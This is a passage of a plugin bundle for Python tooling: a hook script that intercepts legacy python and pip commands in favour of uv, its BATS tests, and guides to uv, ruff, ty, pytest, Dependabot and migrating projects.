        "plugins/modern-python/README.md": "# Modern Python\n\nModern Python tooling and best practices using uv, ruff, ty, and pytest. Based on patterns from [trailofbits/cookiecutter-python](https://github.com/trailofbits/cookiecutter-python).\n\n**Author:** William Tan\n\n## When to Use\n\n- Setting up a new Python project with modern, fast tooling\n- Replacing pip/virtualenv with uv for faster dependency management\n- Replacing flake8/black/isort with ruff for unified linting and formatting\n- Replacing mypy with ty for faster type checking\n- Adding pre-commit hooks and security scanning to an existing project\n\n## What It Covers\n\n**Core Tools:**\n- **uv** - Package/dependency management (replaces pip, virtualenv, pip-tools, pipx, pyenv)\n- **ruff** - Linting and formatting (replaces flake8, black, isort, pyupgrade)\n- **ty** - Type checking (replaces mypy, pyright)\n- **pytest** - Testing with coverage enforcement\n- **prek** - Pre-commit hooks (replaces pre-commit)\n\n**Security Tools:**\n- **shellcheck** - Shell script linting\n- **detect-secrets** - Secret detection in commits\n- **actionlint** - GitHub Actions syntax validation\n- **zizmor** - GitHub Actions security audit\n- **pip-audit** - Dependency vulnerability scanning\n- **Dependabot** - Automated dependency updates with supply chain protection\n\n**Standards:**\n- **pyproject.toml** - Single configuration file with dependency groups (PEP 735)\n- **PEP 723** - Inline script metadata for single-file scripts\n- **src/ layout** - Standard package structure\n- **Python 3.11+** - Minimum version requirement\n\n## Hook: Legacy Command Interception\n\nThis plugin includes a `PreToolUse` hook that intercepts legacy Python/pip commands and suggests uv alternatives. When Claude attempts to run commands like `python` or `pip install`, the hook blocks the command and provides guidance:\n\n| Legacy Command | Suggested Alternative |\n|----------------|----------------------|\n| `python` | `uv run python` |\n| `python script.py` | `uv run script.py` |\n| `pip install pkg` | `uv add pkg` or `uv run --with pkg` |\n| `pip uninstall pkg` | `uv remove pkg` |\n| `pip freeze` | `uv export` |\n| `python -m pip` | `uv add`/`uv remove` |\n| `uv pip` | `uv add`/`uv remove`/`uv sync` |\n\nCommands using `uv run` are allowed through without interception.\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/modern-python\n```\n",
        "plugins/modern-python/hooks/hooks.json": "{\n  \"description\": \"Intercept legacy Python/pip commands and suggest uv alternatives\",\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"bash \\\"${CLAUDE_PLUGIN_ROOT}/hooks/intercept-legacy-python.sh\\\"\"\n          }\n        ]\n      }\n    ]\n  }\n}\n",
        "plugins/modern-python/hooks/intercept-legacy-python.bats": "#!/usr/bin/env bats\n# Tests for intercept-legacy-python.sh hook\n\nload test_helper\n\n# =============================================================================\n# Early Exit Tests\n# =============================================================================\n\n@test \"exits silently when uv is not available\" {\n  # Run with restricted PATH that excludes uv\n  run_hook_no_uv \"python script.py\"\n  assert_allow\n}\n\n@test \"exits silently on invalid JSON input\" {\n  run bash -c 'echo \"not json\" | '\"'$HOOK_SCRIPT'\"\n  assert_allow\n}\n\n@test \"exits silently on empty JSON\" {\n  run bash -c 'echo \"{}\" | '\"'$HOOK_SCRIPT'\"\n  assert_allow\n}\n\n@test \"exits silently when command is empty string\" {\n  run bash -c 'echo \"{\\\"tool_input\\\":{\\\"command\\\":\\\"\\\"}}\" | '\"'$HOOK_SCRIPT'\"\n  assert_allow\n}\n\n@test \"exits silently when command field is missing\" {\n  run bash -c 'echo \"{\\\"tool_input\\\":{}}\" | '\"'$HOOK_SCRIPT'\"\n  assert_allow\n}\n\n# =============================================================================\n# Allow: uv run (proper usage)\n# =============================================================================\n\n@test \"allows uv run python\" {\n  run_hook \"uv run python script.py\"\n  assert_allow\n}\n\n@test \"allows uv run with script directly\" {\n  run_hook \"uv run script.py\"\n  assert_allow\n}\n\n@test \"allows uv run python -m module\" {\n  run_hook \"uv run python -m pytest\"\n  assert_allow\n}\n\n@test \"allows uv run after semicolon\" {\n  run_hook \"cd project; uv run python script.py\"\n  assert_allow\n}\n\n@test \"allows uv run after &&\" {\n  run_hook \"cd project && uv run python script.py\"\n  assert_allow\n}\n\n# =============================================================================\n# Allow: Diagnostic Commands\n# =============================================================================\n\n@test \"allows which python\" {\n  run_hook \"which python\"\n  assert_allow\n}\n\n@test \"allows which python3\" {\n  run_hook \"which python3\"\n  assert_allow\n}\n\n@test \"allows which pip\" {\n  run_hook \"which pip\"\n  assert_allow\n}\n\n@test \"allows which pip3\" {\n  run_hook \"which pip3\"\n  assert_allow\n}\n\n@test \"allows type python\" {\n  run_hook \"type python\"\n  assert_allow\n}\n\n@test \"allows type python3\" {\n  run_hook \"type python3\"\n  assert_allow\n}\n\n@test \"allows whereis python\" {\n  run_hook \"whereis python\"\n  assert_allow\n}\n\n@test \"allows whereis pip\" {\n  run_hook \"whereis pip\"\n  assert_allow\n}\n\n@test \"allows command -v python\" {\n  run_hook \"command -v python\"\n  assert_allow\n}\n\n@test \"allows command -v python3\" {\n  run_hook \"command -v python3\"\n  assert_allow\n}\n\n@test \"allows command -v pip\" {\n  run_hook \"command -v pip\"\n  assert_allow\n}\n\n@test \"allows command -v pip3\" {\n  run_hook \"command -v pip3\"\n  assert_allow\n}\n\n# =============================================================================\n# Allow: Search Tools (python as argument, not command)\n# =============================================================================\n\n@test \"allows grep python file.txt\" {\n  run_hook \"grep python file.txt\"\n  assert_allow\n}\n\n@test \"allows grep -r python src/\" {\n  run_hook \"grep -r python src/\"\n  assert_allow\n}\n\n@test \"allows rg python src/\" {\n  run_hook \"rg python src/\"\n  assert_allow\n}\n\n@test \"allows ag python .\" {\n  run_hook \"ag python .\"\n  assert_allow\n}\n\n@test \"allows ack python\" {\n  run_hook \"ack python\"\n  assert_allow\n}\n\n@test \"allows find with python in name pattern\" {\n  run_hook \"find . -name '*.py'\"\n  assert_allow\n}\n\n@test \"allows find with python string pattern\" {\n  run_hook \"find . -name 'python*'\"\n  assert_allow\n}\n\n@test \"allows grep piped to non-python command\" {\n  run_hook \"grep -l TODO | xargs rm\"\n  assert_allow\n}\n\n@test \"allows find piped to grep\" {\n  run_hook \"find . -name '*.py' | grep test\"\n  assert_allow\n}\n\n# =============================================================================\n# Deny: Direct Python Execution\n# =============================================================================\n\n@test \"denies python script.py\" {\n  run_hook \"python script.py\"\n  assert_deny\n  assert_suggestion_contains \"uv run python\"\n}\n\n@test \"denies python3 script.py\" {\n  run_hook \"python3 script.py\"\n  assert_deny\n  assert_suggestion_contains \"uv run python\"\n}\n\n@test \"denies python -c 'print(1)'\" {\n  run_hook \"python -c 'print(1)'\"\n  assert_deny\n  assert_suggestion_contains \"uv run python\"\n}\n\n@test \"denies python3 -m pytest\" {\n  run_hook \"python3 -m pytest\"\n  assert_deny\n  assert_suggestion_contains \"uv run python -m module\"\n}\n\n@test \"denies python -m module\" {\n  run_hook \"python -m http.server\"\n  assert_deny\n  assert_suggestion_contains \"uv run python -m module\"\n}\n\n@test \"denies python -m pip install\" {\n  run_hook \"python -m pip install requests\"\n  assert_deny\n  assert_suggestion_contains \"uv add\"\n}\n\n@test \"denies python3 -m pip install\" {\n  run_hook \"python3 -m pip install requests\"\n  assert_deny\n  assert_suggestion_contains \"uv add\"\n}\n\n# =============================================================================\n# Deny: Pip Commands\n# =============================================================================\n\n@test \"denies pip install\" {\n  run_hook \"pip install requests\"\n  assert_deny\n  assert_suggestion_contains \"uv add\"\n}\n\n@test \"denies pip3 install\" {\n  run_hook \"pip3 install requests\"\n  assert_deny\n  assert_suggestion_contains \"uv add\"\n}\n\n@test \"denies pip uninstall\" {\n  run_hook \"pip uninstall requests\"\n  assert_deny\n  assert_suggestion_contains \"uv remove\"\n}\n\n@test \"denies pip3 uninstall\" {\n  run_hook \"pip3 uninstall foo\"\n  assert_deny\n  assert_suggestion_contains \"uv remove\"\n}\n\n@test \"denies pip freeze\" {\n  run_hook \"pip freeze\"\n  assert_deny\n  assert_suggestion_contains \"uv export\"\n}\n\n@test \"denies pip3 freeze\" {\n  run_hook \"pip3 freeze\"\n  assert_deny\n  assert_suggestion_contains \"uv export\"\n}\n\n@test \"denies pip list\" {\n  run_hook \"pip list\"\n  assert_deny\n  assert_suggestion_contains \"uv\"\n}\n\n@test \"denies pip show\" {\n  run_hook \"pip show requests\"\n  assert_deny\n  assert_suggestion_contains \"uv\"\n}\n\n# =============================================================================\n# Deny: uv pip (legacy interface)\n# =============================================================================\n\n@test \"denies uv pip install\" {\n  run_hook \"uv pip install requests\"\n  assert_deny\n  assert_suggestion_contains \"uv pip\"\n  assert_suggestion_contains \"legacy\"\n}\n\n@test \"denies uv pip sync\" {\n  run_hook \"uv pip sync requirements.txt\"\n  assert_deny\n  assert_suggestion_contains \"uv pip\"\n  assert_suggestion_contains \"legacy\"\n}\n\n@test \"denies uv pip compile\" {\n  run_hook \"uv pip compile requirements.in\"\n  assert_deny\n  assert_suggestion_contains \"uv pip\"\n  assert_suggestion_contains \"legacy\"\n}\n\n@test \"denies uv pip freeze\" {\n  run_hook \"uv pip freeze\"\n  assert_deny\n  assert_suggestion_contains \"uv pip\"\n  assert_suggestion_contains \"legacy\"\n}\n\n# =============================================================================\n# Deny: Piped Commands with Python Execution\n# =============================================================================\n\n@test \"denies python3 script.py | grep foo\" {\n  run_hook \"python3 script.py | grep foo\"\n  assert_deny\n}\n\n@test \"denies python script.py | head\" {\n  run_hook \"python script.py | head\"\n  assert_deny\n}\n\n@test \"denies find | xargs python3\" {\n  run_hook \"find . -name '*.py' | xargs python3\"\n  assert_deny\n}\n\n@test \"denies grep | xargs python script.py\" {\n  run_hook \"grep -l test | xargs python script.py\"\n  assert_deny\n}\n\n@test \"denies cat file | python3\" {\n  run_hook \"cat file.txt | python3\"\n  assert_deny\n}\n\n@test \"denies echo | python -c\" {\n  run_hook \"echo 'data' | python -c 'import sys; print(sys.stdin.read())'\"\n  assert_deny\n}\n\n# =============================================================================\n# Deny: Compound Commands\n# =============================================================================\n\n@test \"denies python after semicolon\" {\n  run_hook \"cd project; python script.py\"\n  assert_deny\n}\n\n@test \"denies python after &&\" {\n  run_hook \"cd project && python script.py\"\n  assert_deny\n}\n\n@test \"denies python in subshell\" {\n  run_hook \"output=\\$(python script.py)\"\n  assert_deny\n}\n\n@test \"denies pip after semicolon\" {\n  run_hook \"cd project; pip install requests\"\n  assert_deny\n}\n\n# =============================================================================\n# Edge Cases\n# =============================================================================\n\n@test \"allows command with python in path component\" {\n  run_hook \"cat /usr/bin/python3\"\n  assert_allow\n}\n\n@test \"allows ls of python directory\" {\n  run_hook \"ls ~/.python_history\"\n  assert_allow\n}\n\n@test \"denies bare python with no args\" {\n  run_hook \"python\"\n  assert_deny\n}\n\n@test \"denies bare python3 with no args\" {\n  run_hook \"python3\"\n  assert_deny\n}\n",
        "plugins/modern-python/hooks/intercept-legacy-python.sh": "#!/usr/bin/env bash\nset -euo pipefail\n\n# Fast exit if uv not available\ncommand -v uv &>/dev/null || exit 0\n\n# Parse JSON input\ninput_command=$(jq -r '.tool_input.command // empty' 2>/dev/null) || exit 0\n[[ -z \"$input_command\" ]] && exit 0\n\nsuggestion=\"\"\n\n# Skip if the command uses uv run (the proper way)\n# This handles: uv run python, uv run script.py, etc.\nif [[ $input_command =~ (^|[[:space:];|&])uv[[:space:]]+run[[:space:]] ]]; then\n  exit 0\nfi\n\n# Skip diagnostic commands (checking python location, not executing it)\nif [[ $input_command =~ (^|[[:space:];|&])(which|type|whereis)[[:space:]]+(python3?|pip3?)([[:space:]]|$) ]]; then\n  exit 0\nfi\nif [[ $input_command =~ command[[:space:]]+-v[[:space:]]+(python3?|pip3?)([[:space:]]|$) ]]; then\n  exit 0\nfi\n\n# Skip search tools when python/pip is NOT being executed\n# Handles: grep python (OK), python | grep (DENY), find | xargs python (DENY)\nif [[ $input_command =~ (^|[[:space:];|&])(grep|rg|ag|ack|find)[[:space:]] ]]; then\n  # Check for python/pip at COMMAND position before any pipe\n  # Command position: start of string (with optional whitespace) or after ; or &\n  before_pipe=\"${input_command%%|*}\"\n  py_at_start='^[[:space:]]*(python3?|pip3?)([[:space:]]|$)'\n  py_after_sep='[;&][[:space:]]*(python3?|pip3?)([[:space:]]|$)'\n  if [[ $before_pipe =~ $py_at_start ]] || [[ $before_pipe =~ $py_after_sep ]]; then\n    : # Python executes before pipe - fall through to deny\n  # Check for xargs/parallel invoking python/pip after pipe\n  elif [[ $input_command == *\"|\"* ]]; then\n    after_pipe=\"${input_command#*|}\"\n    if [[ $after_pipe =~ (xargs|parallel)[[:space:]] ]] &&\n      [[ $after_pipe =~ (python3?|pip3?)([[:space:]]|$) ]]; then\n      : # xargs/parallel invokes python - fall through to deny\n    else\n      exit 0 # No python execution found\n    fi\n  else\n    exit 0 # No pipe, search tool only - python is just an argument\n  fi\nfi\n\n# Pattern matching for legacy commands\n# Match at: start of line, after ; && || | $( or whitespace\n# Captures the matched command (python/python3/pip/pip3) in group 2\nlegacy_pattern='(^|[;&|]|\\$\\(|[[:space:]])(python3?|pip3?)([[:space:]]|$)'\n\nif [[ $input_command =~ $legacy_pattern ]]; then\n  matched=\"${BASH_REMATCH[2]}\"\n\n  # Determine suggestion based on what was matched\n  # Build patterns using the matched command\n  # shellcheck disable=SC2016\n  case \"$matched\" in\n    python | python3)\n      pip_pattern=\"${matched}[[:space:]]+-m[[:space:]]+pip\"\n      module_pattern=\"${matched}[[:space:]]+-m[[:space:]]\"\n      if [[ $input_command =~ $pip_pattern ]]; then\n        suggestion='`python -m pip` -> `uv add`/`uv remove`'\n      elif [[ $input_command =~ $module_pattern ]]; then\n        suggestion='`python -m module` -> `uv run python -m module`'\n      else\n        suggestion='`python` -> `uv run python`'\n      fi\n      ;;\n    pip | pip3)\n      install_pattern=\"${matched}[[:space:]]+install\"\n      uninstall_pattern=\"${matched}[[:space:]]+uninstall\"\n      freeze_pattern=\"${matched}[[:space:]]+freeze\"\n      if [[ $input_command =~ $install_pattern ]]; then\n        suggestion='`pip install` -> `uv add` or `uv run --with pkg`'\n      elif [[ $input_command =~ $uninstall_pattern ]]; then\n        suggestion='`pip uninstall` -> `uv remove`'\n      elif [[ $input_command =~ $freeze_pattern ]]; then\n        suggestion='`pip freeze` -> `uv export`'\n      else\n        suggestion='`pip` -> use `uv` commands instead'\n      fi\n      ;;\n  esac\nfi\n\n# Also check for `uv pip` (legacy interface)\nuv_pip_pattern='(^|[[:space:];|&])uv[[:space:]]+pip([[:space:]]|$)'\nif [[ $input_command =~ $uv_pip_pattern ]]; then\n  # shellcheck disable=SC2016\n  suggestion='`uv pip` is legacy. Use: `uv add`, `uv remove`, `uv sync`'\nfi\n\n[[ -z \"$suggestion\" ]] && exit 0\n\n# Output denial with suggestion\ncat <<EOF\n{\n  \"hookSpecificOutput\": {\n    \"hookEventName\": \"PreToolUse\",\n    \"permissionDecision\": \"deny\",\n    \"permissionDecisionReason\": \"Use uv instead: ${suggestion}\"\n  }\n}\nEOF\n",
        "plugins/modern-python/hooks/test_helper.bash": "#!/usr/bin/env bash\n# Test helper functions for intercept-legacy-python.sh BATS tests\n# shellcheck disable=SC2154  # status/output are BATS-provided variables\n# shellcheck disable=SC2016  # Single quotes for jq filter are intentional\n\n# Path to the hook script under test\nHOOK_SCRIPT=\"${BATS_TEST_DIRNAME}/intercept-legacy-python.sh\"\n\n# Run the hook with a bash command\n# Usage: run_hook \"python script.py\"\n# Uses jq to properly escape the command string for JSON\nrun_hook() {\n  local cmd=\"$1\"\n  # Use jq to create properly escaped JSON, pipe directly to script\n  run bash -c 'jq -n --arg cmd \"$1\" '\"'\"'{\"tool_input\":{\"command\":$cmd}}'\"'\"' | \"$2\"' _ \"$cmd\" \"$HOOK_SCRIPT\"\n}\n\n# Run hook without uv available (for testing early exit)\n# Usage: run_hook_no_uv \"python script.py\"\nrun_hook_no_uv() {\n  local cmd=\"$1\"\n  # Create a subshell with restricted PATH that excludes uv\n  # Suppress stderr to ignore jq's \"Broken pipe\" when script exits early\n  run env PATH=/usr/bin:/bin bash -c 'jq -n --arg cmd \"$1\" '\"'\"'{\"tool_input\":{\"command\":$cmd}}'\"'\"' 2>/dev/null | \"$2\"' _ \"$cmd\" \"$HOOK_SCRIPT\"\n}\n\n# Assert the hook allowed the command (exit 0, no output)\nassert_allow() {\n  if [[ $status -ne 0 ]]; then\n    echo \"Expected exit 0 (allow), got exit $status\"\n    echo \"Output: $output\"\n    return 1\n  fi\n  if [[ -n \"$output\" ]]; then\n    echo \"Expected no output (allow), got:\"\n    echo \"$output\"\n    return 1\n  fi\n}\n\n# Assert the hook denied the command (JSON output with deny decision)\nassert_deny() {\n  if [[ $status -ne 0 ]]; then\n    echo \"Expected exit 0 with deny JSON, got exit $status\"\n    echo \"Output: $output\"\n    return 1\n  fi\n  if [[ -z \"$output\" ]]; then\n    echo \"Expected deny JSON output, got empty\"\n    return 1\n  fi\n  if ! echo \"$output\" | jq -e '.hookSpecificOutput.permissionDecision == \"deny\"' >/dev/null 2>&1; then\n    echo \"Expected permissionDecision: deny\"\n    echo \"Output: $output\"\n    return 1\n  fi\n}\n\n# Assert the suggestion contains expected text\n# Usage: assert_suggestion_contains \"uv run python\"\nassert_suggestion_contains() {\n  local expected=\"$1\"\n  local reason\n  reason=$(echo \"$output\" | jq -r '.hookSpecificOutput.permissionDecisionReason // empty' 2>/dev/null)\n  if [[ -z \"$reason\" ]]; then\n    echo \"No permissionDecisionReason found in output\"\n    echo \"Output: $output\"\n    return 1\n  fi\n  if [[ \"$reason\" != *\"$expected\"* ]]; then\n    echo \"Expected suggestion to contain: $expected\"\n    echo \"Got: $reason\"\n    return 1\n  fi\n}\n",
        "plugins/modern-python/skills/modern-python/SKILL.md": "---\nname: modern-python\ndescription: Configures Python projects with modern tooling (uv, ruff, ty). Use when creating projects, writing standalone scripts, or migrating from pip/Poetry/mypy/black.\n---\n\n# Modern Python\n\nGuide for modern Python tooling and best practices, based on [trailofbits/cookiecutter-python](https://github.com/trailofbits/cookiecutter-python).\n\n## When to Use This Skill\n\n- Creating a new Python project or package\n- Setting up `pyproject.toml` configuration\n- Configuring development tools (linting, formatting, testing)\n- Writing Python scripts with external dependencies\n- Migrating from legacy tools (when user requests it)\n\n## When NOT to Use This Skill\n\n- **User wants to keep legacy tooling**: Respect existing workflows if explicitly requested\n- **Python < 3.11 required**: These tools target modern Python\n- **Non-Python projects**: Mixed codebases where Python isn't primary\n\n## Anti-Patterns to Avoid\n\n| Avoid | Use Instead |\n|-------|-------------|\n| `[tool.ty]` python-version | `[tool.ty.environment]` python-version |\n| `uv pip install` | `uv add` and `uv sync` |\n| Editing pyproject.toml manually to add deps | `uv add <pkg>` / `uv remove <pkg>` |\n| `hatchling` build backend | `uv_build` (simpler, sufficient for most cases) |\n| Poetry | uv (faster, simpler, better ecosystem integration) |\n| requirements.txt | PEP 723 for scripts, pyproject.toml for projects |\n| mypy / pyright | ty (faster, from Astral team) |\n| `[project.optional-dependencies]` for dev tools | `[dependency-groups]` (PEP 735) |\n| Manual virtualenv activation (`source .venv/bin/activate`) | `uv run <cmd>` |\n| pre-commit | prek (faster, no Python runtime needed) |\n\n**Key principles:**\n- Always use `uv add` and `uv remove` to manage dependencies\n- Never manually activate or manage virtual environmentsuse `uv run` for all commands\n- Use `[dependency-groups]` for dev/test/docs dependencies, not `[project.optional-dependencies]`\n\n## Decision Tree\n\n```\nWhat are you doing?\n\n Single-file script with dependencies?\n    Use PEP 723 inline metadata (./references/pep723-scripts.md)\n\n New multi-file project (not distributed)?\n    Minimal uv setup (see Quick Start below)\n\n New reusable package/library?\n    Full project setup (see Full Setup below)\n\n Migrating existing project?\n     See Migration Guide below\n```\n\n## Tool Overview\n\n| Tool | Purpose | Replaces |\n|------|---------|----------|\n| **uv** | Package/dependency management | pip, virtualenv, pip-tools, pipx, pyenv |\n| **ruff** | Linting AND formatting | flake8, black, isort, pyupgrade, pydocstyle |\n| **ty** | Type checking | mypy, pyright (faster alternative) |\n| **pytest** | Testing with coverage | unittest |\n| **prek** | Pre-commit hooks ([setup](./references/prek.md)) | pre-commit (faster, Rust-native) |\n\n### Security Tools\n\n| Tool | Purpose | When It Runs |\n|------|---------|--------------|\n| **shellcheck** | Shell script linting | pre-commit |\n| **detect-secrets** | Secret detection | pre-commit |\n| **actionlint** | Workflow syntax validation | pre-commit, CI |\n| **zizmor** | Workflow security audit | pre-commit, CI |\n| **pip-audit** | Dependency vulnerability scanning | CI, manual |\n| **Dependabot** | Automated dependency updates | scheduled |\n\nSee [security-setup.md](./references/security-setup.md) for configuration and usage.\n\n## Quick Start: Minimal Project\n\nFor simple multi-file projects not intended for distribution:\n\n```bash\n# Create project with uv\nuv init myproject\ncd myproject\n\n# Add dependencies\nuv add requests rich\n\n# Add dev dependencies\nuv add --group dev pytest ruff ty\n\n# Run code\nuv run python src/myproject/main.py\n\n# Run tools\nuv run pytest\nuv run ruff check .\n```\n\n## Full Project Setup\nIf starting from scratch, ask the user if they prefer to use the Trail of Bits cookiecutter template to bootstrap a complete project with already preconfigured tooling.\n\n```bash\nuvx cookiecutter gh:trailofbits/cookiecutter-python\n```\n\n### 1. Create Project Structure\n\n```bash\nuv init --package myproject\ncd myproject\n```\n\nThis creates:\n```\nmyproject/\n pyproject.toml\n README.md\n src/\n    myproject/\n        __init__.py\n .python-version\n```\n\n### 2. Configure pyproject.toml\n\nSee [pyproject.md](./references/pyproject.md) for complete configuration reference.\n\nKey sections:\n```toml\n[project]\nname = \"myproject\"\nversion = \"0.1.0\"\nrequires-python = \">=3.11\"\ndependencies = []\n\n[dependency-groups]\ndev = [{include-group = \"lint\"}, {include-group = \"test\"}, {include-group = \"audit\"}]\nlint = [\"ruff\", \"ty\"]\ntest = [\"pytest\", \"pytest-cov\"]\naudit = [\"pip-audit\"]\n\n[tool.ruff]\nline-length = 100\ntarget-version = \"py311\"\n\n[tool.ruff.lint]\nselect = [\"ALL\"]\nignore = [\"D\", \"COM812\", \"ISC001\"]\n\n[tool.pytest]\naddopts = [\"--cov=myproject\", \"--cov-fail-under=80\"]\n\n[tool.ty.terminal]\nerror-on-warning = true\n\n[tool.ty.environment]\npython-version = \"3.11\"\n\n[tool.ty.rules]\n# Strict from day 1 for new projects\npossibly-unresolved-reference = \"error\"\nunused-ignore-comment = \"warn\"\n```\n\n### 3. Install Dependencies\n\n```bash\n# Install all dependency groups\nuv sync --all-groups\n\n# Or install specific groups\nuv sync --group dev\n```\n\n### 4. Add Makefile\n\n```makefile\n.PHONY: dev lint format test build\n\ndev:\n\tuv sync --all-groups\n\nlint:\n\tuv run ruff format --check && uv run ruff check && uv run ty check src/\n\nformat:\n\tuv run ruff format .\n\ntest:\n\tuv run pytest\n\nbuild:\n\tuv build\n```\n\n## Migration Guide\n\nWhen a user requests migration from legacy tooling:\n\n### From requirements.txt + pip\n\nFirst, determine the nature of the code:\n\n**For standalone scripts**: Convert to PEP 723 inline metadata (see [pep723-scripts.md](./references/pep723-scripts.md))\n\n**For projects**:\n```bash\n# Initialize uv in existing project\nuv init --bare\n\n# Add dependencies using uv (not by editing pyproject.toml)\nuv add requests rich  # add each package\n\n# Or import from requirements.txt (review each package before adding)\n# Note: Complex version specifiers may need manual handling\ngrep -v '^#' requirements.txt | grep -v '^-' | grep -v '^\\s*$' | while read -r pkg; do\n    uv add \"$pkg\" || echo \"Failed to add: $pkg\"\ndone\n\nuv sync\n```\n\nThen:\n1. Delete `requirements.txt`, `requirements-dev.txt`\n2. Delete virtual environment (`venv/`, `.venv/`)\n3. Add `uv.lock` to version control\n\n### From setup.py / setup.cfg\n\n1. Run `uv init --bare` to create pyproject.toml\n2. Use `uv add` to add each dependency from `install_requires`\n3. Use `uv add --group dev` for dev dependencies\n4. Copy non-dependency metadata (name, version, description, etc.) to `[project]`\n5. Delete `setup.py`, `setup.cfg`, `MANIFEST.in`\n\n### From flake8 + black + isort\n\n1. Remove flake8, black, isort via `uv remove`\n2. Delete `.flake8`, `pyproject.toml [tool.black]`, `[tool.isort]` configs\n3. Add ruff: `uv add --group dev ruff`\n4. Add ruff configuration (see [ruff-config.md](./references/ruff-config.md))\n5. Run `uv run ruff check --fix .` to apply fixes\n6. Run `uv run ruff format .` to format\n\n### From mypy / pyright\n\n1. Remove mypy/pyright via `uv remove`\n2. Delete `mypy.ini`, `pyrightconfig.json`, or `[tool.mypy]`/`[tool.pyright]` sections\n3. Add ty: `uv add --group dev ty`\n4. Run `uv run ty check src/`\n\n## Quick Reference: uv Commands\n\n| Command | Description |\n|---------|-------------|\n| `uv init` | Create new project |\n| `uv init --package` | Create distributable package |\n| `uv add <pkg>` | Add dependency |\n| `uv add --group dev <pkg>` | Add to dependency group |\n| `uv remove <pkg>` | Remove dependency |\n| `uv sync` | Install dependencies |\n| `uv sync --all-groups` | Install all dependency groups |\n| `uv run <cmd>` | Run command in venv |\n| `uv run --with <pkg> <cmd>` | Run with temporary dependency |\n| `uv build` | Build package |\n| `uv publish` | Publish to PyPI |\n\n### Ad-hoc Dependencies with `--with`\n\nUse `uv run --with` for one-off commands that need packages not in your project:\n\n```bash\n# Run Python with a temporary package\nuv run --with requests python -c \"import requests; print(requests.get('https://httpbin.org/ip').json())\"\n\n# Run a module with temporary deps\nuv run --with rich python -m rich.progress\n\n# Multiple packages\nuv run --with requests --with rich python script.py\n\n# Combine with project deps (adds to existing venv)\nuv run --with httpx pytest  # project deps + httpx\n```\n\n**When to use `--with` vs `uv add`:**\n- `uv add`: Package is a project dependency (goes in pyproject.toml/uv.lock)\n- `--with`: One-off usage, testing, or scripts outside a project context\n\nSee [uv-commands.md](./references/uv-commands.md) for complete reference.\n\n## Quick Reference: Dependency Groups\n\n```toml\n[dependency-groups]\ndev = [\"ruff\", \"ty\"]\ntest = [\"pytest\", \"pytest-cov\", \"hypothesis\"]\ndocs = [\"sphinx\", \"myst-parser\"]\n```\n\nInstall with: `uv sync --group dev --group test`\n\n## Best Practices Checklist\n\n- [ ] Use `src/` layout for packages\n- [ ] Set `requires-python = \">=3.11\"`\n- [ ] Configure ruff with `select = [\"ALL\"]` and explicit ignores\n- [ ] Use ty for type checking\n- [ ] Enforce test coverage minimum (80%+)\n- [ ] Use dependency groups instead of extras for dev tools\n- [ ] Add `uv.lock` to version control\n- [ ] Use PEP 723 for standalone scripts\n\n## Read Next\n\n- [migration-checklist.md](./references/migration-checklist.md) - Step-by-step migration cleanup\n- [pyproject.md](./references/pyproject.md) - Complete pyproject.toml reference\n- [uv-commands.md](./references/uv-commands.md) - uv command reference\n- [ruff-config.md](./references/ruff-config.md) - Ruff linting/formatting configuration\n- [testing.md](./references/testing.md) - pytest and coverage setup\n- [pep723-scripts.md](./references/pep723-scripts.md) - PEP 723 inline script metadata\n- [prek.md](./references/prek.md) - Fast pre-commit hooks with prek\n- [security-setup.md](./references/security-setup.md) - Security hooks and dependency scanning\n- [dependabot.md](./references/dependabot.md) - Automated dependency updates\n",
        "plugins/modern-python/skills/modern-python/references/dependabot.md": "# Dependabot: Automated Dependency Updates\n\n[Dependabot](https://docs.github.com/en/code-security/dependabot) automatically creates pull requests to keep your dependencies up to date. GitHub hosts it nativelyno external service required.\n\n## Why Use Dependabot?\n\n- **Security**: Automatically patches known vulnerabilities\n- **Freshness**: Keeps dependencies current without manual tracking\n- **Visibility**: PRs show changelogs and compatibility notes\n\n## Configuration\n\nCopy [templates/dependabot.yml](../templates/dependabot.yml) to `.github/dependabot.yml`.\n\nThe template includes:\n- Weekly update schedule for pip and GitHub Actions\n- 7-day cooldown for supply chain protection\n- Grouping to reduce PR noise\n\n## Supply Chain Protection\n\nThe `cooldown.default-days: 7` setting delays updates for newly published versions. This provides time for the community to detect compromised packages before they reach your project.\n\n**Why this matters:**\n- Attackers sometimes publish malicious versions of legitimate packages\n- A 7-day delay allows time for detection and removal\n- Combined with weekly schedules, this balances security with freshness\n\n## Common Options\n\n| Option | Description |\n|--------|-------------|\n| `interval` | `daily`, `weekly`, or `monthly` |\n| `cooldown.default-days` | Days to wait before updating new releases |\n| `ignore` | Skip specific dependencies or versions |\n| `groups` | Group related updates into single PRs |\n| `reviewers` | Auto-assign reviewers to PRs |\n\n## See Also\n\n- [GitHub Dependabot docs](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file)\n- [security-setup.md](./security-setup.md) - Security tooling overview\n- [prek.md](./prek.md) - Pre-commit hooks (complementary tool)\n",
        "plugins/modern-python/skills/modern-python/references/migration-checklist.md": "# Migration Checklist\n\nComprehensive checklist for migrating Python projects to modern tooling.\n\n## Before Migration\n\n- [ ] **Determine layout**: `src/` or flat? Configure `[tool.uv.build-backend]` if flat\n- [ ] **Decide uv.lock strategy**: app (commit) vs library (.gitignore)\n- [ ] **Backup current state**: Create a branch or tag before starting\n\n## Cleanup Old Artifacts\n\nFind and remove legacy linter comments:\n\n```bash\n# Find files with old linter pragmas\nrg \"# pylint:|# noqa:|# type: ignore\" --files-with-matches\n\n# Find missing __init__.py files\nuv run ruff check --select=INP001 .\n```\n\nRemove these files after migration:\n- [ ] `requirements.txt`, `requirements-dev.txt`\n- [ ] `setup.py`, `setup.cfg`, `MANIFEST.in`\n- [ ] `.flake8`, `mypy.ini`, `pyrightconfig.json`\n- [ ] `tox.ini` (if not needed)\n- [ ] `Pipfile`, `Pipfile.lock`\n- [ ] Old virtual environments (`venv/`, `.venv/`)\n\n## .gitignore Updates\n\nAdd these entries:\n\n```gitignore\n# Python\n__pycache__/\n*.py[cod]\n.venv/\n\n# Tools\n.ruff_cache/\n.ty/\n\n# uv (for libraries only - apps should commit uv.lock)\n# uv.lock\n```\n\n## pyproject.toml Sections to Remove\n\n- [ ] `[tool.black]`\n- [ ] `[tool.isort]`\n- [ ] `[tool.mypy]`\n- [ ] `[tool.pyright]`\n- [ ] `[tool.pylint]`\n- [ ] `[tool.flake8]` (if 